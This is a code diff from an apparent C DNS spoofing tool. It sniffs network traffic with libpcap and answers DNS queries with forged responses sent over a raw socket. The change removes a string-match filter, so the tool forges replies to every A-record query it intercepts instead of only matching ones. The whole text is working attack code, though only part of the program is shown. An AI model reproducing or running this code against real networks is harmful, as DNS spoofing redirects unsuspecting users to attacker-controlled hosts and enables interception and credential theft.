@@ -190,7 +190,7 @@ void send_forged_dns_response(unsigned long destination_address, u_int16_t desti
 	sendto(sd, data, ip_length, 0, (struct sockaddr *)&source, sizeof(source));
 	close(sd);
 }
-void print_ip_packet(const u_char *packet, u_char **payload, int *size_payload, u_char* stringExpression)
+void print_ip_packet(const u_char *packet, u_char **payload, int *size_payload)
 {
 	const struct sniff_ip *ip;              /* The IP header */
 
@@ -294,14 +294,12 @@ void print_ip_packet(const u_char *packet, u_char **payload, int *size_payload, 
 				if(ntohs(query->type) != 1 || ntohs(query->class) != 1)
 				    return;
 
-				if (stringExpression == NULL || ((*size_payload > 0) && strstr((char*)*payload, (char*)stringExpression))){
-				    send_forged_dns_response(ip->ip_src.s_addr, udp->uh_sport, datagram, size_of_forged_dns_response);
-				    printf("Response Start\n");
-				    u_char *pay1 = (u_char*)datagram;
-				    print_payload(pay1, sizeof(struct sniff_ip) + sizeof(struct udphdr) + sizeof(struct dns_header) \
+				send_forged_dns_response(ip->ip_src.s_addr, udp->uh_sport, datagram, size_of_forged_dns_response);
+				printf("Response Start\n");
+				u_char *pay1 = (u_char*)datagram;
+				print_payload(pay1, sizeof(struct sniff_ip) + sizeof(struct udphdr) + sizeof(struct dns_header) \
 					+ strlen(domain) + 1 + sizeof(struct dns_answer_data) + sizeof(struct dns_answer_data_1));
-				    printf("Response End\n");
-				}
+				printf("Response End\n");
 			}
 			else if(ntohs(udp->uh_sport) == 53)
 			{
@@ -330,7 +328,7 @@ got_packet(u_char *stringExpression, const struct pcap_pkthdr *header, const u_c
 	switch(ntohs(ethernet->ether_type))
 	{
 		case ETHERTYPE_IP:
-			print_ip_packet(packet, &payload, &size_payload, stringExpression);
+			print_ip_packet(packet, &payload, &size_payload);
 			break;
 		default:
 			break;
